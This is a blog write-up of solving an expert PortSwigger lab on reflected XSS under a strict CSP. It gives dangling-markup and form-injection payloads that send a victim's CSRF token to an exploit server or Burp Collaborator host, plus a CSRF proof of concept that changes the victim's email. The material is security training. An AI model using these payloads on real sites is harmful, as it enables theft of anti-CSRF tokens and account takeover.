---
title: Reflected XSS protected by very strict CSP, with dangling markup attack
date: 2023-11-25 00:34:00 +0800
categories: [Web, XSS]
tags: [Web, Portswigger]
---
Today is nearly two years since the first Portswigger Web Security was solved, I solved the last one. In this blog post, I'll share how I solve it.

## Description of the Lab

- Lab Level: Expert

This lab uses a strict [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) that blocks outgoing requests to external websites.

To solve the lab, first perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the CSP and exfiltrates a simulated victim user's [CSRF](https://portswigger.net/web-security/csrf) token using Burp Collaborator. You then need to change the simulated user's email address to `hacker@evil-user.net`.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

`<a href="">Click me</a>`

You can log in to your own account using the following credentials: `wiener:peter`

The lab has CSP `Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';` which make it harder to be exploited because it prevents all the access to out domains although you can inject HTML tags like `img` or `table`  

The vulnerable parameter is `email` in endpoint `/my-account/change-email` and the XSS payload is being reflected in the `/my-account`

## First Solution 

Portswigger official solution is to use a payload to exploit dangling markup attack by sending `base` tag with attribute `target='` ending in single quote which will make the rest of the page being sent to the exploit server or Burp collaborator client abusing the same `eamil` parameter with link `a` tag as following:

```javascript
<script>
if(window.name) {
		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email="><a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target='';
}
</script>
```

![[ln1.png]]

If it sends successfully the name of the DOM `window` name will be changed to obtain the CSRF token then send it to the victim to change it's email address.  

![[ln2.png]]

Unfortunately, this exploit doesn't work anymore on Google Chrome, By only working in Firefox we can't solve the lab because the victim is only using Chrome client.

## Contacting Portswigger Team 

I was wondering why this behavior is like this I read on thread in [their website](https://forum.portswigger.net/thread/lab-reflected-xss-protected-by-csp-with-dangling-markup-attack-288ada8e) of a user complaining of such problem but in 2022 of update on Google Chrome make the lab unsolvable. So, I ask them about it and indeed it was this and they reblied that there is a competition to see if any other users can also figures this out on [X](https://twitter.com/portswiggerres/status/1726605124443750893?s=46) I notice that no one reply on it in the last 4 days then I take it personal challenge to solve it.

## The Problem 

The real problem I'm facing is to make the application callback to exploits server. I tried many 

## The Solution
 
The exploit scenario in my mind: 
- Determine how to make the application callback the exploit server.
- Craft exploit to exflitrate the CSRF token on myslef then the victim.
- Craft a POC to change the email of the email address of the victem after gettting its CSRF token. 

After trying many things I come thought a writeup called [Postcards from the post-XSS world (2011)](https://lcamtuf.coredump.cx/postxss/) indeed it was old but I really was determine to solve it. I a section the witter talk about how you can inject a `form` tag so the parser will ignore the first one and use the one that I craft to get the CSRF token and start with: 

```javascript 
"></form><form%20class="login-form"%20name="evil-form"%20action="https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log"%20method="POST">
```

After some tries and playing with HTML I know all the factors and how it suppose to work and it finally did!

![[Pasted image 20231125122402.png]]

```javascript
%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log%22%20method=%22POST%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E
```

![[Pasted image 20231125122458.png]]

Put it in the exploit server:

```
<script>
location='https://0a3a006c041ba288822ff20900fa00c8.web-security-academy.net/my-account?email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E';
</script>
```

I delivered the exploit to victim and got the CSRF token:

![[Pasted image 20231125113705.png]]

Then go to the `/my-account/change-email` and make a POC using BurpSuite:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3a006c041ba288822ff20900fa00c8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="Qqk80OwNNtB2cMUyIanl6OfjlXbydxgf" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

Finally the lab is solved!

![[solved.png]]

And officially I solved all the Portswigger labs and ranked as on their hall of fame

![[Pasted image 20231125124325.png]]
